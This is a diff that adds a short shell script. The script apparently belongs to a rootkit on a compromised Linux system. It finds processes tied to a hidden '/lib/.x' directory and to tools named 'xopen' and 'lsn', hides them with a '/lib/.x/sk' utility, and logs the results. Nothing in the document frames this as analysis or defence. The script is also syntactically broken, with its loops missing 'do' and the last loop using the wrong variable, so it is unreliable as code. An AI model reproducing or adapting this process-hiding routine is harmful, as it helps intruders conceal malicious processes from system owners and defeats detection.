@@ -1,0 +1,10 @@
+#!/bin/sh
+for i in $(ps aux|grep "/lib/.x"|awk -F " " '{print $2}')
+/lib/.x/sk i $i >>/lib/.x/hide.log
+done
+for z in $(ps aux|grep xopen|awk -F " " '{print $2}')
+/lib/.x/sk i $z >>/lib/.x/hide.log
+done
+for x in $(ps aux|grep lsn|awk -F " " '{print $2}')
+/lib/.x/sk i $z >>/lib/.x/hide.log
+done
